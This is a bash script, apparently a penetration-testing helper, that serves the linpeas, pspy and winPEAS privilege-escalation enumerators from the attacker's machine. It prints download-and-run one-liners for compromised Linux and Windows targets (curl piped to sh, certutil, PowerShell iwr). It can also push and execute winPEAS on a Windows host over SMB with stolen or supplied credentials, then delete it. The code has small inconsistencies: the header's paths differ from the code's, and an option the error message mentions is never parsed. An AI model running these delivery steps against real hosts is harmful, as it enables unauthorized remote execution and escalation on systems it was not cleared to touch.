#!/usr/bin/env bash
#
# privesc.sh - serve & deliver privilege-escalation enumerators
# -----------------------------------------------------------------------------
# Stages the PEAS/pspy enumerators from /opt/data/linux + /opt/data/windows and
# gives you the fetch-and-run one-liners for a foothold shell, so you don't have
# to manually copy tools onto every box:
#   1. Start an HTTP server over the tool directory.
#   2. Print copy-paste one-liners for Linux (linpeas, pspy) and Windows
#      (winPEAS) to download+run from the target.
#   3. Optional --exec: push winPEAS to a Windows host via netexec and run it
#      (needs creds), capturing output locally.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: post-exploitation on in-scope hosts.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./privesc.sh -l <LHOST> [-P <http_port>]                # serve + print one-liners
#   ./privesc.sh -l <LHOST> --exec -i <win_host> -u U -p P [-d dom]   # auto winPEAS
#
# DEPENDENCIES: python3 (server); netexec (--exec). Tools from /opt/data/{linux,windows}.
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_hdr(){  printf '\n\033[1;36m# %s\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

LHOST="" PORT=8000 EXEC="" WHOST="" USER="" PASS="" DOMAIN=""
usage(){ sed -n '2,24p' "$0"; exit 1; }
while getopts "l:P:i:u:p:d:h-:" o; do case "$o" in
  l) LHOST=$OPTARG;; P) PORT=$OPTARG;; i) WHOST=$OPTARG;; u) USER=$OPTARG;;
  p) PASS=$OPTARG;; d) DOMAIN=$OPTARG;;
  -) case "$OPTARG" in exec) EXEC=1;; *) usage;; esac;;
  *) usage;;
esac; done
[ -z "$LHOST" ] && { c_err "need -l <LHOST>"; usage; }

LIN=/opt/tools/linux; WIN=/opt/tools/windows/winPEAS
SRV=/tmp/privesc_srv; mkdir -p "$SRV"
for f in "$LIN/linpeas.sh" "$LIN/pspy64" "$WIN/winPEASany.exe" "$WIN/winPEASx64.exe"; do
  [ -f "$f" ] && cp -f "$f" "$SRV/" 2>/dev/null || true
done
c_ok "Serving $(ls "$SRV" | tr '\n' ' ')"

if [ -n "$EXEC" ]; then
  [ -z "$WHOST" ] || [ -z "$USER" ] && { c_err "--exec needs -i <host> -u <user> (-p/-H)"; usage; }
  NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done
  [ -z "$NXC" ] && { c_err "netexec not found"; exit 1; }
  OUT="./privesc_${WHOST}_$(date +%Y%m%d_%H%M%S)"; mkdir -p "$OUT"
  AUTH=( -u "$USER" ); [ -n "$PASS" ] && AUTH+=( -p "$PASS" ); [ -n "$DOMAIN" ] && AUTH+=( -d "$DOMAIN" )
  c_hdr "Pushing + running winPEAS on $WHOST"
  $NXC smb "$WHOST" "${AUTH[@]}" --put-file "$WIN/winPEASany.exe" '\Windows\Temp\wp.exe' 2>&1 | tail -2 || c_warn "upload failed"
  $NXC smb "$WHOST" "${AUTH[@]}" -x 'C:\Windows\Temp\wp.exe quiet' 2>&1 | tee "$OUT/winpeas.txt" || c_warn "exec failed"
  $NXC smb "$WHOST" "${AUTH[@]}" -x 'del C:\Windows\Temp\wp.exe' >/dev/null 2>&1 || true
  c_ok "winPEAS output -> $OUT/winpeas.txt"
  exit 0
fi

c_hdr "Linux target (run on the box)"
echo "curl -s http://$LHOST:$PORT/linpeas.sh | sh            # or: wget -qO- ...| sh"
echo "curl -s http://$LHOST:$PORT/pspy64 -o /tmp/p && chmod +x /tmp/p && /tmp/p   # watch cron/procs"
c_hdr "Windows target (run on the box)"
echo "certutil -urlcache -split -f http://$LHOST:$PORT/winPEASany.exe %TEMP%\\wp.exe & %TEMP%\\wp.exe"
echo "powershell -c \"iwr http://$LHOST:$PORT/winPEASx64.exe -OutFile \$env:TEMP\\wp.exe; & \$env:TEMP\\wp.exe\""
c_hdr "Reminder"
echo "Local checklists: /opt/data/hackathon/checklists/privesc-{linux,windows}-checklist.md"

c_ok "HTTP server on :$PORT (Ctrl-C to stop)"
exec python3 -m http.server "$PORT" --directory "$SRV"
